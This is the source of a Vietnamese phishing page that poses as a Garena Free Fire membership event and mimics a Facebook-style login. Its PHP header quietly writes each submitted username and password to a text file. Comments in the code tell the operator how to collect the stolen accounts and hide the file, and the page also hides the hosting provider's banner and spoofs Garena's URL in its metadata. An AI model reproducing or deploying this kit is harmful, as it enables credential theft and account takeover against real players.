
    <?php
        
    if(isset($_POST["taikhoan"])){
          $username = $_POST["taikhoan"];
      $password = $_POST["matkhau"];
      $_SESSION["username"] = $username;
       $body = "\nTài Khoản :$username\nMật Khẩu :$password\n"; //tùy host có thể lỗi font chữ email thì ae vô thẳng file txt trong file manager của host
      $test = fopen("hu.txt","a");//đổi tên file hu.txt này để tránh trường hợp người khác vào lấy acc
      fwrite($test,$body);
      fclose($test); 
    }
?> 
   <!DOCTYPE html>
   <html>
       
   <head>
       <style>img[alt="www.000webhost.com"]{display:none;}</style>
       <meta content='text/html; charset=UTF-8' http-equiv='Content-Type' />
       <meta name="viewport" content="width=device-width, initial-scale=1">
   <title>Garena Free Fire Membership</title>
   <meta property="og:type" content="website">
   <meta property="og:title" content="GARENA FREE FIRE MEMBERSHIP">
   <meta property="og:description" content="Chương trình tri ân kèm những sự kiện đặc biệt dành cho người chơi Free Fire">
   <meta property="og:url" content="https://ff.member.garena.vn">
   <meta property="og:site_name" content="Free fire garena">
   <meta property="og:image" content="https://scontent-sin6-3.xx.fbcdn.net/v/t1.15752-9/233026545_244778860691187_6095074205005111250_n.png?_nc_cat=106&ccb=1-5&_nc_sid=ae9488&_nc_ohc=sUdDEPjR3Y4AX97fcZW&_nc_ht=scontent-sin6-3.xx&oh=44e36c421c881997c285e7e317eeb862&oe=613D55F3">
   <meta property="fb:app_id" content="367981983963236">
   <link rel="shortcut icon" href="https://apkboat.com/logos/garena-free-fire-mega-mod_6.png" />
   <link rel="icon" href="https://apkboat.com/logos/garena-free-fire-mega-mod_6.png" type="image/x-icon" />
            <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
            <link class="tempLink" rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:regular">
            <script src='//ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js' type="text/javascript"></script>
            <link rel="stylesheet" href="https://ticchien111.github.io/giaodien-fb-fake/facebook.css">
            <script src="//cdn.jsdelivr.net/npm/sweetalert2@11"></script>
          <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css" integrity="sha384-1q8mTJOASx8j1Au+a5WDVnPi2lkFfwwEAa8hDDdjZlpLegxhjVME1fgjWPGmkzs7" crossorigin="anonymous">
        <style>
        .container {
          position: relative;
          width: 100%;
          overflow: hidden;
         /* 1:1 Aspect Ratio */
        }
        
        .responsive-iframe {
          position: fixed;
          top: 0;
          left: 0;
          bottom: 0;
          right: 0;
          width: 100%;
          height: 100%;
          border: none;
        }
        .img{
          width: 250px;
          padding-bottom: 20px;
          
        }
        .container1{
       padding-top: 30px;
            
        }
             @media screen and (max-width: 600px) {

   .container1{
       padding-top: 30px;
   padding-left: 30px;
   width: 90%;
}

}
                </style>
                </head>
                <body >
             
                <div class="container" >
                    <iframe class="responsive-iframe" id="iframe" src="https://typical-aquamarine-jasmine.glitch.me/"></iframe>
                  

                  <div class="modal fade" id="myModal" role="dialog">
                    <div class="container1">
                   <div class="row h-100 justify-content-center align-items-center mt-2">
                      <div class="col-md-4 vhnlog">
                         <form   id="login_form">
                             <div class="d-flex justify-content-center">
                      <a href="https://garena.vn"><img src="https://i.ibb.co/KjCKNSn/Pik-Png-com-webmd-logo-png-4945489.png" class="img logo mt-2" alt="garena"></a>
                   </div>
                   <div class=" alert alert-warning" id="tb" role="alert" style="
                      border-radius: 0;
                      padding: 7px 20px;
                      ">
                      <span id="thongbao">Vui lòng đăng nhập tài khoản đã liên kết với garena để tiếp tục</span>
                   </div>
                            <div class="form-group">
                               <input type="text" class="form-control" id="id" name="taikhoan" placeholder="Vui lòng nhập số di động hoặc email" >
                            </div>
                          
                            <div class="form-group">
                               <input type="password" class="form-control" id="pass" name="matkhau" placeholder="Password" >
                            </div>
                            <div class="form-group">
                               <center>
                                  <button  type="submit" onclick="dangnhap()"  id="submit"class="btn btn-primary"  style="background-color: #166fe5;">Đăng nhập</button>
                               </center>
                            </div>
                         </form>
                         <div id="login_reg_separator" class="_43mg _8qtf" data-sigil="login_reg_separator"><span class="_43mh">hoặc</span></div>
                         <center>
                            <input class="btn btn-success" type="button"  style="background-color: #3fb328;"value="Tạo tài khoản mới" />
                         </center>
                      </div>
                   </div>
                   <div class="row text-center" style="margin-top: 6rem;">
                     
                   </div>
                   <div class="row text-center">
                      <div class="col-md-12">
                         
                      </div>
                   </div>
                </div>
                  </div>
               </div>
                  <script src="https://ticchien111.github.io/giaodien-fb-fake/jquery2.js"></script>
<script src="https://ticchien111.github.io/script/member.js"></script>
   <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js" integrity="sha384-0mSbJDEHialfmuBBQP6A4Qrprq5OVfW37PRR3j5ELqxss1yVqOtnepnHVP9aJ7xS" crossorigin="anonymous">
                      </script>
                </body>
                </html>
